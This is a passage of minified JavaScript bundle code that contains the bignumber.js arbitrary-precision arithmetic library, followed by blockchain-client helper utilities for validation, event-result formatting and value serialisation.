                            e;
                        if (0 == i ? (f.length = l,
                        a = 1,
                        l--) : (f.length = l + 1,
                        a = p[qC - i],
                        f[l] = s > 0 ? jC(c / p[o - s] % p[s]) * a : 0),
                        n)
                            for (; ; ) {
                                if (0 == l) {
                                    for (i = 1,
                                    s = f[0]; s >= 10; s /= 10,
                                    i++)
                                        ;
                                    for (s = f[0] += a,
                                    a = 1; s >= 10; s /= 10,
                                    a++)
                                        ;
                                    i != a && (e.e++,
                                    f[0] == HC && (f[0] = 1));
                                    break
                                }
                                if (f[l] += a,
                                f[l] != HC)
                                    break;
                                f[l--] = 0,
                                a = 1
                            }
                        for (i = f.length; 0 === f[--i]; f.pop())
                            ;
                    }
                    e.e > h ? e.c = e.e = null : e.e < d && (e.c = [e.e = 0])
                }
                return e
            }
            function P(e) {
                var t, r = e.e;
                return null === r ? e.toString() : (t = JC(e.c),
                t = r <= l || r >= u ? tS(t, r) : rS(t, r, "0"),
                e.s < 0 ? "-" + t : t)
            }
            return v.clone = e,
            v.ROUND_UP = 0,
            v.ROUND_DOWN = 1,
            v.ROUND_CEIL = 2,
            v.ROUND_FLOOR = 3,
            v.ROUND_HALF_UP = 4,
            v.ROUND_HALF_DOWN = 5,
            v.ROUND_HALF_EVEN = 6,
            v.ROUND_HALF_CEIL = 7,
            v.ROUND_HALF_FLOOR = 8,
            v.EUCLID = 9,
            v.config = v.set = function(e) {
                var t, r;
                if (null != e) {
                    if ("object" != typeof e)
                        throw Error(zC + "Object expected: " + e);
                    if (e.hasOwnProperty(t = "DECIMAL_PLACES") && (QC(r = e[t], 0, ZC, t),
                    a = r),
                    e.hasOwnProperty(t = "ROUNDING_MODE") && (QC(r = e[t], 0, 8, t),
                    c = r),
                    e.hasOwnProperty(t = "EXPONENTIAL_AT") && ((r = e[t]) && r.pop ? (QC(r[0], -ZC, 0, t),
                    QC(r[1], 0, ZC, t),
                    l = r[0],
                    u = r[1]) : (QC(r, -ZC, ZC, t),
                    l = -(u = r < 0 ? -r : r))),
                    e.hasOwnProperty(t = "RANGE"))
                        if ((r = e[t]) && r.pop)
                            QC(r[0], -ZC, -1, t),
                            QC(r[1], 1, ZC, t),
                            d = r[0],
                            h = r[1];
                        else {
                            if (QC(r, -ZC, ZC, t),
                            !r)
                                throw Error(zC + t + " cannot be zero: " + r);
                            d = -(h = r < 0 ? -r : r)
                        }
                    if (e.hasOwnProperty(t = "CRYPTO")) {
                        if ((r = e[t]) !== !!r)
                            throw Error(zC + t + " not true or false: " + r);
                        if (r) {
                            if ("undefined" == typeof crypto || !crypto || !crypto.getRandomValues && !crypto.randomBytes)
                                throw f = !r,
                                Error(zC + "crypto unavailable");
                            f = r
                        } else
                            f = r
                    }
                    if (e.hasOwnProperty(t = "MODULO_MODE") && (QC(r = e[t], 0, 9, t),
                    p = r),
                    e.hasOwnProperty(t = "POW_PRECISION") && (QC(r = e[t], 0, ZC, t),
                    g = r),
                    e.hasOwnProperty(t = "FORMAT")) {
                        if ("object" != typeof (r = e[t]))
                            throw Error(zC + t + " not an object: " + r);
                        y = r
                    }
                    if (e.hasOwnProperty(t = "ALPHABET")) {
                        if ("string" != typeof (r = e[t]) || /^.?$|[+\-.\s]|(.).*\1/.test(r))
                            throw Error(zC + t + " invalid: " + r);
                        b = "0123456789" == r.slice(0, 10),
                        m = r
                    }
                }
                return {
                    DECIMAL_PLACES: a,
                    ROUNDING_MODE: c,
                    EXPONENTIAL_AT: [l, u],
                    RANGE: [d, h],
                    CRYPTO: f,
                    MODULO_MODE: p,
                    POW_PRECISION: g,
                    FORMAT: y,
                    ALPHABET: m
                }
            }
            ,
            v.isBigNumber = function(e) {
                if (!e || !0 !== e._isBigNumber)
                    return !1;
                if (!v.DEBUG)
                    return !0;
                var t, r, n = e.c, o = e.e, i = e.s;
                e: if ("[object Array]" == {}.toString.call(n)) {
                    if ((1 === i || -1 === i) && o >= -ZC && o <= ZC && o === jC(o)) {
                        if (0 === n[0]) {
                            if (0 === o && 1 === n.length)
                                return !0;
                            break e
                        }
                        if ((t = (o + 1) % qC) < 1 && (t += qC),
                        String(n[0]).length == t) {
                            for (t = 0; t < n.length; t++)
                                if ((r = n[t]) < 0 || r >= HC || r !== jC(r))
                                    break e;
                            if (0 !== r)
                                return !0
                        }
                    }
                } else if (null === n && null === o && (null === i || 1 === i || -1 === i))
                    return !0;
                throw Error(zC + "Invalid BigNumber: " + e)
            }
            ,
            v.maximum = v.max = function() {
                return T(arguments, -1)
            }
            ,
            v.minimum = v.min = function() {
                return T(arguments, 1)
            }
            ,
            v.random = function() {
                var e = 9007199254740992
                  , t = Math.random() * e & 2097151 ? function() {
                    return jC(Math.random() * e)
                }
                : function() {
                    return 8388608 * (1073741824 * Math.random() | 0) + (8388608 * Math.random() | 0)
                }
                ;
                return function(e) {
                    var r, n, o, i, c, l = 0, u = [], d = new v(s);
                    if (null == e ? e = a : QC(e, 0, ZC),
                    i = LC(e / qC),
                    f)
                        if (crypto.getRandomValues) {
                            for (r = crypto.getRandomValues(new Uint32Array(i *= 2)); l < i; )
                                (c = 131072 * r[l] + (r[l + 1] >>> 11)) >= 9e15 ? (n = crypto.getRandomValues(new Uint32Array(2)),
                                r[l] = n[0],
                                r[l + 1] = n[1]) : (u.push(c % 1e14),
                                l += 2);
                            l = i / 2
                        } else {
                            if (!crypto.randomBytes)
                                throw f = !1,
                                Error(zC + "crypto unavailable");
                            for (r = crypto.randomBytes(i *= 7); l < i; )
                                (c = 281474976710656 * (31 & r[l]) + 1099511627776 * r[l + 1] + 4294967296 * r[l + 2] + 16777216 * r[l + 3] + (r[l + 4] << 16) + (r[l + 5] << 8) + r[l + 6]) >= 9e15 ? crypto.randomBytes(7).copy(r, l) : (u.push(c % 1e14),
                                l += 7);
                            l = i / 7
                        }
                    if (!f)
                        for (; l < i; )
                            (c = t()) < 9e15 && (u[l++] = c % 1e14);
                    for (i = u[--l],
                    e %= qC,
                    i && e && (c = $C[qC - e],
                    u[l] = jC(i / c) * c); 0 === u[l]; u.pop(),
                    l--)
                        ;
                    if (l < 0)
                        u = [o = 0];
                    else {
                        for (o = -1; 0 === u[0]; u.splice(0, 1),
                        o -= qC)
                            ;
                        for (l = 1,
                        c = u[0]; c >= 10; c /= 10,
                        l++)
                            ;
                        l < qC && (o -= qC - l)
                    }
                    return d.e = o,
                    d.c = u,
                    d
                }
            }(),
            v.sum = function() {
                for (var e = 1, t = arguments, r = new v(t[0]); e < t.length; )
                    r = r.plus(t[e++]);
                return r
            }
            ,
            n = function() {
                var e = "0123456789";
                function t(e, t, r, n) {
                    for (var o, i, s = [0], a = 0, c = e.length; a < c; ) {
                        for (i = s.length; i--; s[i] *= t)
                            ;
                        for (s[0] += n.indexOf(e.charAt(a++)),
                        o = 0; o < s.length; o++)
                            s[o] > r - 1 && (null == s[o + 1] && (s[o + 1] = 0),
                            s[o + 1] += s[o] / r | 0,
                            s[o] %= r)
                    }
                    return s.reverse()
                }
                return function(n, o, i, s, l) {
                    var u, d, h, f, p, y, b, w, T = n.indexOf("."), A = a, E = c;
                    for (T >= 0 && (f = g,
                    g = 0,
                    n = n.replace(".", ""),
                    y = (w = new v(o)).pow(n.length - T),
                    g = f,
                    w.c = t(rS(JC(y.c), y.e, "0"), 10, i, e),
                    w.e = w.c.length),
                    h = f = (b = t(n, o, i, l ? (u = m,
                    e) : (u = e,
                    m))).length; 0 == b[--f]; b.pop())
                        ;
                    if (!b[0])
                        return u.charAt(0);
                    if (T < 0 ? --h : (y.c = b,
                    y.e = h,
                    y.s = s,
                    b = (y = r(y, w, A, E, i)).c,
                    p = y.r,
                    h = y.e),
                    T = b[d = h + A + 1],
                    f = i / 2,
                    p = p || d < 0 || null != b[d + 1],
                    p = E < 4 ? (null != T || p) && (0 == E || E == (y.s < 0 ? 3 : 2)) : T > f || T == f && (4 == E || p || 6 == E && 1 & b[d - 1] || E == (y.s < 0 ? 8 : 7)),
                    d < 1 || !b[0])
                        n = p ? rS(u.charAt(1), -A, u.charAt(0)) : u.charAt(0);
                    else {
                        if (b.length = d,
                        p)
                            for (--i; ++b[--d] > i; )
                                b[d] = 0,
                                d || (++h,
                                b = [1].concat(b));
                        for (f = b.length; !b[--f]; )
                            ;
                        for (T = 0,
                        n = ""; T <= f; n += u.charAt(b[T++]))
                            ;
                        n = rS(n, h, u.charAt(0))
                    }
                    return n
                }
            }(),
            r = function() {
                function e(e, t, r) {
                    var n, o, i, s, a = 0, c = e.length, l = t % KC, u = t / KC | 0;
                    for (e = e.slice(); c--; )
                        a = ((o = l * (i = e[c] % KC) + (n = u * i + (s = e[c] / KC | 0) * l) % KC * KC + a) / r | 0) + (n / KC | 0) + u * s,
                        e[c] = o % r;
                    return a && (e = [a].concat(e)),
                    e
                }
                function t(e, t, r, n) {
                    var o, i;
                    if (r != n)
                        i = r > n ? 1 : -1;
                    else
                        for (o = i = 0; o < r; o++)
                            if (e[o] != t[o]) {
                                i = e[o] > t[o] ? 1 : -1;
                                break
                            }
                    return i
                }
                function r(e, t, r, n) {
                    for (var o = 0; r--; )
                        e[r] -= o,
                        o = e[r] < t[r] ? 1 : 0,
                        e[r] = o * n + e[r] - t[r];
                    for (; !e[0] && e.length > 1; e.splice(0, 1))
                        ;
                }
                return function(n, o, i, s, a) {
                    var c, l, u, d, h, f, p, g, y, m, b, w, T, A, P, C, S, I = n.s == o.s ? 1 : -1, B = n.c, x = o.c;
                    if (!B || !B[0] || !x || !x[0])
                        return new v(n.s && o.s && (B ? !x || B[0] != x[0] : x) ? B && 0 == B[0] || !x ? 0 * I : I / 0 : NaN);
                    for (y = (g = new v(I)).c = [],
                    I = i + (l = n.e - o.e) + 1,
                    a || (a = HC,
                    l = YC(n.e / qC) - YC(o.e / qC),
                    I = I / qC | 0),
                    u = 0; x[u] == (B[u] || 0); u++)
                        ;
                    if (x[u] > (B[u] || 0) && l--,
                    I < 0)
                        y.push(1),
                        d = !0;
                    else {
                        for (A = B.length,
                        C = x.length,
                        u = 0,
                        I += 2,
                        (h = jC(a / (x[0] + 1))) > 1 && (x = e(x, h, a),
                        B = e(B, h, a),
                        C = x.length,
                        A = B.length),
                        T = C,
                        b = (m = B.slice(0, C)).length; b < C; m[b++] = 0)
                            ;
                        S = x.slice(),
                        S = [0].concat(S),
                        P = x[0],
                        x[1] >= a / 2 && P++;
                        do {
                            if (h = 0,
                            (c = t(x, m, C, b)) < 0) {
                                if (w = m[0],
                                C != b && (w = w * a + (m[1] || 0)),
                                (h = jC(w / P)) > 1)
                                    for (h >= a && (h = a - 1),
                                    p = (f = e(x, h, a)).length,
                                    b = m.length; 1 == t(f, m, p, b); )
                                        h--,
                                        r(f, C < p ? S : x, p, a),
                                        p = f.length,
                                        c = 1;
                                else
                                    0 == h && (c = h = 1),
                                    p = (f = x.slice()).length;
                                if (p < b && (f = [0].concat(f)),
                                r(m, f, b, a),
                                b = m.length,
                                -1 == c)
                                    for (; t(x, m, C, b) < 1; )
                                        h++,
                                        r(m, C < b ? S : x, b, a),
                                        b = m.length
                            } else
                                0 === c && (h++,
                                m = [0]);
                            y[u++] = h,
                            m[0] ? m[b++] = B[T] || 0 : (m = [B[T]],
                            b = 1)
                        } while ((T++ < A || null != m[0]) && I--);
                        d = null != m[0],
                        y[0] || y.splice(0, 1)
                    }
                    if (a == HC) {
                        for (u = 1,
                        I = y[0]; I >= 10; I /= 10,
                        u++)
                            ;
                        E(g, i + (g.e = u + l * qC - 1) + 1, s, d)
                    } else
                        g.e = l,
                        g.r = +d;
                    return g
                }
            }(),
            o = function() {
                var e = /^(-?)0([xbo])(?=\w[\w.]*$)/i
                  , t = /^([^.]+)\.$/
                  , r = /^\.([^.]+)$/
                  , n = /^-?(Infinity|NaN)$/
                  , o = /^\s*\+(?=[\w.])|^\s+|\s+$/g;
                return function(i, s, a, c) {
                    var l, u = a ? s : s.replace(o, "");
                    if (n.test(u))
                        i.s = isNaN(u) ? null : u < 0 ? -1 : 1;
                    else {
                        if (!a && (u = u.replace(e, (function(e, t, r) {
                            return l = "x" == (r = r.toLowerCase()) ? 16 : "b" == r ? 2 : 8,
                            c && c != l ? e : t
                        }
                        )),
                        c && (l = c,
                        u = u.replace(t, "$1").replace(r, "0.$1")),
                        s != u))
                            return new v(u,l);
                        if (v.DEBUG)
                            throw Error(zC + "Not a" + (c ? " base " + c : "") + " number: " + s);
                        i.s = null
                    }
                    i.c = i.e = null
                }
            }(),
            i.absoluteValue = i.abs = function() {
                var e = new v(this);
                return e.s < 0 && (e.s = 1),
                e
            }
            ,
            i.comparedTo = function(e, t) {
                return XC(this, new v(e,t))
            }
            ,
            i.decimalPlaces = i.dp = function(e, t) {
                var r, n, o, i = this;
                if (null != e)
                    return QC(e, 0, ZC),
                    null == t ? t = c : QC(t, 0, 8),
                    E(new v(i), e + i.e + 1, t);
                if (!(r = i.c))
                    return null;
                if (n = ((o = r.length - 1) - YC(this.e / qC)) * qC,
                o = r[o])
                    for (; o % 10 == 0; o /= 10,
                    n--)
                        ;
                return n < 0 && (n = 0),
                n
            }
            ,
            i.dividedBy = i.div = function(e, t) {
                return r(this, new v(e,t), a, c)
            }
            ,
            i.dividedToIntegerBy = i.idiv = function(e, t) {
                return r(this, new v(e,t), 0, 1)
            }
            ,
            i.exponentiatedBy = i.pow = function(e, t) {
                var r, n, o, i, a, l, u, d, h = this;
                if ((e = new v(e)).c && !e.isInteger())
                    throw Error(zC + "Exponent not an integer: " + P(e));
                if (null != t && (t = new v(t)),
                a = e.e > 14,
                !h.c || !h.c[0] || 1 == h.c[0] && !h.e && 1 == h.c.length || !e.c || !e.c[0])
                    return d = new v(Math.pow(+P(h), a ? e.s * (2 - eS(e)) : +P(e))),
                    t ? d.mod(t) : d;
                if (l = e.s < 0,
                t) {
                    if (t.c ? !t.c[0] : !t.s)
                        return new v(NaN);
                    (n = !l && h.isInteger() && t.isInteger()) && (h = h.mod(t))
                } else {
                    if (e.e > 9 && (h.e > 0 || h.e < -1 || (0 == h.e ? h.c[0] > 1 || a && h.c[1] >= 24e7 : h.c[0] < 8e13 || a && h.c[0] <= 9999975e7)))
                        return i = h.s < 0 && eS(e) ? -0 : 0,
                        h.e > -1 && (i = 1 / i),
                        new v(l ? 1 / i : i);
                    g && (i = LC(g / qC + 2))
                }
                for (a ? (r = new v(.5),
                l && (e.s = 1),
                u = eS(e)) : u = (o = Math.abs(+P(e))) % 2,
                d = new v(s); ; ) {
                    if (u) {
                        if (!(d = d.times(h)).c)
                            break;
                        i ? d.c.length > i && (d.c.length = i) : n && (d = d.mod(t))
                    }
                    if (o) {
                        if (0 === (o = jC(o / 2)))
                            break;
                        u = o % 2
                    } else if (E(e = e.times(r), e.e + 1, 1),
                    e.e > 14)
                        u = eS(e);
                    else {
                        if (0 === (o = +P(e)))
                            break;
                        u = o % 2
                    }
                    h = h.times(h),
                    i ? h.c && h.c.length > i && (h.c.length = i) : n && (h = h.mod(t))
                }
                return n ? d : (l && (d = s.div(d)),
                t ? d.mod(t) : i ? E(d, g, c, undefined) : d)
            }
            ,
            i.integerValue = function(e) {
                var t = new v(this);
                return null == e ? e = c : QC(e, 0, 8),
                E(t, t.e + 1, e)
            }
            ,
            i.isEqualTo = i.eq = function(e, t) {
                return 0 === XC(this, new v(e,t))
            }
            ,
            i.isFinite = function() {
                return !!this.c
            }
            ,
            i.isGreaterThan = i.gt = function(e, t) {
                return XC(this, new v(e,t)) > 0
            }
            ,
            i.isGreaterThanOrEqualTo = i.gte = function(e, t) {
                return 1 === (t = XC(this, new v(e,t))) || 0 === t
            }
            ,
            i.isInteger = function() {
                return !!this.c && YC(this.e / qC) > this.c.length - 2
            }
            ,
            i.isLessThan = i.lt = function(e, t) {
                return XC(this, new v(e,t)) < 0
            }
            ,
            i.isLessThanOrEqualTo = i.lte = function(e, t) {
                return -1 === (t = XC(this, new v(e,t))) || 0 === t
            }
            ,
            i.isNaN = function() {
                return !this.s
            }
            ,
            i.isNegative = function() {
                return this.s < 0
            }
            ,
            i.isPositive = function() {
                return this.s > 0
            }
            ,
            i.isZero = function() {
                return !!this.c && 0 == this.c[0]
            }
            ,
            i.minus = function(e, t) {
                var r, n, o, i, s = this, a = s.s;
                if (t = (e = new v(e,t)).s,
                !a || !t)
                    return new v(NaN);
                if (a != t)
                    return e.s = -t,
                    s.plus(e);
                var l = s.e / qC
                  , u = e.e / qC
                  , d = s.c
                  , h = e.c;
                if (!l || !u) {
                    if (!d || !h)
                        return d ? (e.s = -t,
                        e) : new v(h ? s : NaN);
                    if (!d[0] || !h[0])
                        return h[0] ? (e.s = -t,
                        e) : new v(d[0] ? s : 3 == c ? -0 : 0)
                }
                if (l = YC(l),
                u = YC(u),
                d = d.slice(),
                a = l - u) {
                    for ((i = a < 0) ? (a = -a,
                    o = d) : (u = l,
                    o = h),
                    o.reverse(),
                    t = a; t--; o.push(0))
                        ;
                    o.reverse()
                } else
                    for (n = (i = (a = d.length) < (t = h.length)) ? a : t,
                    a = t = 0; t < n; t++)
                        if (d[t] != h[t]) {
                            i = d[t] < h[t];
                            break
                        }
                if (i && (o = d,
                d = h,
                h = o,
                e.s = -e.s),
                (t = (n = h.length) - (r = d.length)) > 0)
                    for (; t--; d[r++] = 0)
                        ;
                for (t = HC - 1; n > a; ) {
                    if (d[--n] < h[n]) {
                        for (r = n; r && !d[--r]; d[r] = t)
                            ;
                        --d[r],
                        d[n] += HC
                    }
                    d[n] -= h[n]
                }
                for (; 0 == d[0]; d.splice(0, 1),
                --u)
                    ;
                return d[0] ? A(e, d, u) : (e.s = 3 == c ? -1 : 1,
                e.c = [e.e = 0],
                e)
            }
            ,
            i.modulo = i.mod = function(e, t) {
                var n, o, i = this;
                return e = new v(e,t),
                !i.c || !e.s || e.c && !e.c[0] ? new v(NaN) : !e.c || i.c && !i.c[0] ? new v(i) : (9 == p ? (o = e.s,
                e.s = 1,
                n = r(i, e, 0, 3),
                e.s = o,
                n.s *= o) : n = r(i, e, 0, p),
                (e = i.minus(n.times(e))).c[0] || 1 != p || (e.s = i.s),
                e)
            }
            ,
            i.multipliedBy = i.times = function(e, t) {
                var r, n, o, i, s, a, c, l, u, d, h, f, p, g, y, m = this, b = m.c, w = (e = new v(e,t)).c;
                if (!b || !w || !b[0] || !w[0])
                    return !m.s || !e.s || b && !b[0] && !w || w && !w[0] && !b ? e.c = e.e = e.s = null : (e.s *= m.s,
                    b && w ? (e.c = [0],
                    e.e = 0) : e.c = e.e = null),
                    e;
                for (n = YC(m.e / qC) + YC(e.e / qC),
                e.s *= m.s,
                (c = b.length) < (d = w.length) && (p = b,
                b = w,
                w = p,
                o = c,
                c = d,
                d = o),
                o = c + d,
                p = []; o--; p.push(0))
                    ;
                for (g = HC,
                y = KC,
                o = d; --o >= 0; ) {
                    for (r = 0,
                    h = w[o] % y,
                    f = w[o] / y | 0,
                    i = o + (s = c); i > o; )
                        r = ((l = h * (l = b[--s] % y) + (a = f * l + (u = b[s] / y | 0) * h) % y * y + p[i] + r) / g | 0) + (a / y | 0) + f * u,
                        p[i--] = l % g;
                    p[i] = r
                }
                return r ? ++n : p.splice(0, 1),
                A(e, p, n)
            }
            ,
            i.negated = function() {
                var e = new v(this);
                return e.s = -e.s || null,
                e
            }
            ,
            i.plus = function(e, t) {
                var r, n = this, o = n.s;
                if (t = (e = new v(e,t)).s,
                !o || !t)
                    return new v(NaN);
                if (o != t)
                    return e.s = -t,
                    n.minus(e);
                var i = n.e / qC
                  , s = e.e / qC
                  , a = n.c
                  , c = e.c;
                if (!i || !s) {
                    if (!a || !c)
                        return new v(o / 0);
                    if (!a[0] || !c[0])
                        return c[0] ? e : new v(a[0] ? n : 0 * o)
                }
                if (i = YC(i),
                s = YC(s),
                a = a.slice(),
                o = i - s) {
                    for (o > 0 ? (s = i,
                    r = c) : (o = -o,
                    r = a),
                    r.reverse(); o--; r.push(0))
                        ;
                    r.reverse()
                }
                for ((o = a.length) - (t = c.length) < 0 && (r = c,
                c = a,
                a = r,
                t = o),
                o = 0; t; )
                    o = (a[--t] = a[t] + c[t] + o) / HC | 0,
                    a[t] = HC === a[t] ? 0 : a[t] % HC;
                return o && (a = [o].concat(a),
                ++s),
                A(e, a, s)
            }
            ,
            i.precision = i.sd = function(e, t) {
                var r, n, o, i = this;
                if (null != e && e !== !!e)
                    return QC(e, 1, ZC),
                    null == t ? t = c : QC(t, 0, 8),
                    E(new v(i), e, t);
                if (!(r = i.c))
                    return null;
                if (n = (o = r.length - 1) * qC + 1,
                o = r[o]) {
                    for (; o % 10 == 0; o /= 10,
                    n--)
                        ;
                    for (o = r[0]; o >= 10; o /= 10,
                    n++)
                        ;
                }
                return e && i.e + 1 > n && (n = i.e + 1),
                n
            }
            ,
            i.shiftedBy = function(e) {
                return QC(e, -9007199254740991, GC),
                this.times("1e" + e)
            }
            ,
            i.squareRoot = i.sqrt = function() {
                var e, t, n, o, i, s = this, l = s.c, u = s.s, d = s.e, h = a + 4, f = new v("0.5");
                if (1 !== u || !l || !l[0])
                    return new v(!u || u < 0 && (!l || l[0]) ? NaN : l ? s : 1 / 0);
                if (0 == (u = Math.sqrt(+P(s))) || u == 1 / 0 ? (((t = JC(l)).length + d) % 2 == 0 && (t += "0"),
                u = Math.sqrt(+t),
                d = YC((d + 1) / 2) - (d < 0 || d % 2),
                n = new v(t = u == 1 / 0 ? "5e" + d : (t = u.toExponential()).slice(0, t.indexOf("e") + 1) + d)) : n = new v(u + ""),
                n.c[0])
                    for ((u = (d = n.e) + h) < 3 && (u = 0); ; )
                        if (i = n,
                        n = f.times(i.plus(r(s, i, h, 1))),
                        JC(i.c).slice(0, u) === (t = JC(n.c)).slice(0, u)) {
                            if (n.e < d && --u,
                            "9999" != (t = t.slice(u - 3, u + 1)) && (o || "4999" != t)) {
                                +t && (+t.slice(1) || "5" != t.charAt(0)) || (E(n, n.e + a + 2, 1),
                                e = !n.times(n).eq(s));
                                break
                            }
                            if (!o && (E(i, i.e + a + 2, 0),
                            i.times(i).eq(s))) {
                                n = i;
                                break
                            }
                            h += 4,
                            u += 4,
                            o = 1
                        }
                return E(n, n.e + a + 1, c, e)
            }
            ,
            i.toExponential = function(e, t) {
                return null != e && (QC(e, 0, ZC),
                e++),
                w(this, e, t, 1)
            }
            ,
            i.toFixed = function(e, t) {
                return null != e && (QC(e, 0, ZC),
                e = e + this.e + 1),
                w(this, e, t)
            }
            ,
            i.toFormat = function(e, t, r) {
                var n, o = this;
                if (null == r)
                    null != e && t && "object" == typeof t ? (r = t,
                    t = null) : e && "object" == typeof e ? (r = e,
                    e = t = null) : r = y;
                else if ("object" != typeof r)
                    throw Error(zC + "Argument not an object: " + r);
                if (n = o.toFixed(e, t),
                o.c) {
                    var i, s = n.split("."), a = +r.groupSize, c = +r.secondaryGroupSize, l = r.groupSeparator || "", u = s[0], d = s[1], h = o.s < 0, f = h ? u.slice(1) : u, p = f.length;
                    if (c && (i = a,
                    a = c,
                    c = i,
                    p -= i),
                    a > 0 && p > 0) {
                        for (i = p % a || a,
                        u = f.substr(0, i); i < p; i += a)
                            u += l + f.substr(i, a);
                        c > 0 && (u += l + f.slice(i)),
                        h && (u = "-" + u)
                    }
                    n = d ? u + (r.decimalSeparator || "") + ((c = +r.fractionGroupSize) ? d.replace(new RegExp("\\d{" + c + "}\\B","g"), "$&" + (r.fractionGroupSeparator || "")) : d) : u
                }
                return (r.prefix || "") + n + (r.suffix || "")
            }
            ,
            i.toFraction = function(e) {
                var t, n, o, i, a, l, u, d, f, p, g, y, m = this, b = m.c;
                if (null != e && (!(u = new v(e)).isInteger() && (u.c || 1 !== u.s) || u.lt(s)))
                    throw Error(zC + "Argument " + (u.isInteger() ? "out of range: " : "not an integer: ") + P(u));
                if (!b)
                    return new v(m);
                for (t = new v(s),
                f = n = new v(s),
                o = d = new v(s),
                y = JC(b),
                a = t.e = y.length - m.e - 1,
                t.c[0] = $C[(l = a % qC) < 0 ? qC + l : l],
                e = !e || u.comparedTo(t) > 0 ? a > 0 ? t : f : u,
                l = h,
                h = 1 / 0,
                u = new v(y),
                d.c[0] = 0; p = r(u, t, 0, 1),
                1 != (i = n.plus(p.times(o))).comparedTo(e); )
                    n = o,
                    o = i,
                    f = d.plus(p.times(i = f)),
                    d = i,
                    t = u.minus(p.times(i = t)),
                    u = i;
                return i = r(e.minus(n), o, 0, 1),
                d = d.plus(i.times(f)),
                n = n.plus(i.times(o)),
                d.s = f.s = m.s,
                g = r(f, o, a *= 2, c).minus(m).abs().comparedTo(r(d, n, a, c).minus(m).abs()) < 1 ? [f, o] : [d, n],
                h = l,
                g
            }
            ,
            i.toNumber = function() {
                return +P(this)
            }
            ,
            i.toPrecision = function(e, t) {
                return null != e && QC(e, 1, ZC),
                w(this, e, t, 2)
            }
            ,
            i.toString = function(e) {
                var t, r = this, o = r.s, i = r.e;
                return null === i ? o ? (t = "Infinity",
                o < 0 && (t = "-" + t)) : t = "NaN" : (null == e ? t = i <= l || i >= u ? tS(JC(r.c), i) : rS(JC(r.c), i, "0") : 10 === e && b ? t = rS(JC((r = E(new v(r), a + i + 1, c)).c), r.e, "0") : (QC(e, 2, m.length, "Base"),
                t = n(rS(JC(r.c), i, "0"), 10, e, o, !0)),
                o < 0 && r.c[0] && (t = "-" + t)),
                t
            }
            ,
            i.valueOf = i.toJSON = function() {
                return P(this)
            }
            ,
            i._isBigNumber = !0,
            i[Symbol.toStringTag] = "BigNumber",
            i[Symbol.for("nodejs.util.inspect.custom")] = i.valueOf,
            null != t && v.set(t),
            v
        }();
        var oS = r(4650);
        function iS(e) {
            return "string" === typeof e && oS.isURL(e.toString(), {
                protocols: ["http", "https"],
                require_tld: !1
            })
        }
        function sS(e) {
            return e === Object(e) && "[object Array]" !== Object.prototype.toString.call(e)
        }
        function aS(e) {
            return Array.isArray(e)
        }
        function cS(e) {
            try {
                return !!JSON.parse(e)
            } catch (t) {
                return !1
            }
        }
        function lS(e) {
            return "boolean" === typeof e
        }
        function uS(e) {
            return !!e && (e instanceof nS || e.constructor && "BigNumber" === e.constructor.name)
        }
        function dS(e) {
            return "string" === typeof e || !!e && e.constructor && "String" === e.constructor.name
        }
        function hS(e) {
            return "function" === typeof e
        }
        function fS(e) {
            return "string" === typeof e && !isNaN(parseInt(e, 16)) && /^(0x|)[a-fA-F0-9]+$/.test(e)
        }
        function pS(e) {
            return null !== e && Number.isInteger(Number(e))
        }
        function gS(e, t) {
            return Object.prototype.hasOwnProperty.call(e, t)
        }
        function yS(e) {
            for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                r[n - 1] = arguments[n];
            return r.length && !r.map((t => gS(e, t))).includes(!1)
        }
        function mS(e) {
            const t = {
                block: e.block_number,
                timestamp: e.block_timestamp,
                contract: e.contract_address,
                name: e.event_name,
                transaction: e.transaction_id,
                result: e.result,
                resourceNode: e.resource_Node || (e._unconfirmed ? "fullNode" : "solidityNode")
            };
            return e._unconfirmed && (t.unconfirmed = e._unconfirmed),
            e._fingerprint && (t.fingerprint = e._fingerprint),
            t
        }
        function bS(e, t) {
            let {inputs: r} = t;
            if (!e.result)
                return e;
            if (sS(e.result))
                for (let n = 0; n < r.length; n++) {
                    const t = r[n];
                    "address" == t.type && t.name in e.result && (e.result[t.name] = ZN + e.result[t.name].substr(2).toLowerCase())
                }
            else
                aS(e.result) && (e.result = e.result.reduce(( (e, t, n) => {
                    const {name: o, type: i} = r[n];
                    return "address" == i && (t = ZN + t.substr(2).toLowerCase()),
                    e[o] = t,
                    e
                }
                ), {}));
            return e
        }
        function vS(e, t, r) {
            let n = e.toString();
            for (; n.length < r; )
                n = t + n;
            return n
        }
        function wS(e) {
            return null !== e && "undefined" !== typeof e
        }
        async function TS() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 1e3;
            return new Promise((t => setTimeout(t, e)))
        }
        function AS(e, t) {
            if (t.has(e))
                throw new TypeError("Cannot initialize the same private elements twice on an object")
        }
        function ES(e, t, r) {
            AS(e, t),
            t.set(e, r)
        }
        function PS(e, t, r) {
            if ("function" == typeof e ? e === t : e.has(t))
                return arguments.length < 3 ? t : r;
            throw new TypeError("Private element is not present on this object")
        }
        function CS(e, t, r) {
            return e.set(PS(e, t), r),
            r
        }
        function SS(e, t) {
            return e.get(PS(e, t))
        }
        const IS = "0x0000000000000000000000000000000000000000000000000000000000000000"
          , BS = "6.13.5";
        function xS(e, t, r) {
            const n = t.split("|").map((e => e.trim()));
            for (let i = 0; i < n.length; i++)
                switch (t) {
                case "any":
                    return;
                case "bigint":
                case "boolean":
                case "number":
                case "string":
                    if (typeof e === t)
                        return
                }
            const o = new Error("invalid value for type ".concat(t));
            throw o.code = "INVALID_ARGUMENT",
            o.argument = "value.".concat(r),
            o.value = e,
            o
        }
        async function OS(e) {
            const t = Object.keys(e)
              , r = await Promise.all(t.map((t => Promise.resolve(e[t]))));
            return r.reduce(( (e, r, n) => (e[t[n]] = r,
            e)), {})
        }
        function _S(e, t, r) {
            for (let n in t) {
                let o = t[n];
                const i = r ? r[n] : null;
                i && xS(o, i, n),
                Object.defineProperty(e, n, {
                    enumerable: !0,
                    value: o,
                    writable: !1
                })
            }
        }
        function WS(e) {
            if (null == e)
                return "null";
            if (Array.isArray(e))
                return "[ " + e.map(WS).join(", ") + " ]";
            if (e instanceof Uint8Array) {
                const t = "0123456789abcdef";
                let r = "0x";
                for (let n = 0; n < e.length; n++)
                    r += t[e[n] >> 4],
                    r += t[15 & e[n]];
                return r
            }
            if ("object" === typeof e && "function" === typeof e.toJSON)
                return WS(e.toJSON());
            switch (typeof e) {
            case "boolean":
            case "symbol":
            case "number":
                return e.toString();
            case "bigint":
                return BigInt(e).toString();
            case "string":
                return JSON.stringify(e);
